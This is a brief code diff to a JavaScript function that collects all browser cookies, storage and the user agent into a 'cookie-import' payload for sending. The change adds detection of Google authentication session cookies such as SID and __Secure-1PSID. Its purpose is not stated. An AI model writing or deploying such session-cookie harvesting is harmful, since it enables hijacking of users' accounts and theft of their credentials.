@@ -39,6 +39,18 @@ async function collectAndSend() {
     seen.add(key);
     return true;
   });
+  const googleAuthNames = new Set([
+    'SID', 'HSID', 'SSID', 'APISID', 'SAPISID',
+    '__Secure-1PSID', '__Secure-1PAPISID', '__Secure-1PSIDTS',
+    '__Secure-3PSID', '__Secure-3PAPISID', '__Secure-3PSIDTS'
+  ]);
+  const googleCookies = unique.filter((cookie) => {
+    const host = cookie.domain.replace(/^\./, '');
+    return host === 'google.com' || host.endsWith('.google.com');
+  });
+  const googleAuthCount = googleCookies.filter((cookie) => googleAuthNames.has(cookie.name)).length;
+  const googleAuth = googleCookies.some((cookie) =>
+    cookie.name === 'SID' || cookie.name === '__Secure-1PSID' || cookie.name === '__Secure-3PSID');
   const payload = {
     type: 'cookie-import',
     cookies: unique.map((cookie) => ({
@@ -53,7 +65,7 @@ async function collectAndSend() {
     })),
     userAgent: navigator.userAgent,
     sentAt: Date.now(),
-    diag: { perDomain, totalInStore, storeHosts }
+    diag: { perDomain, totalInStore, storeHosts, googleAuth, googleAuthCount }
   };
   payload.storage = await collectStorage();
   payload.storageStatus = storageStatus;
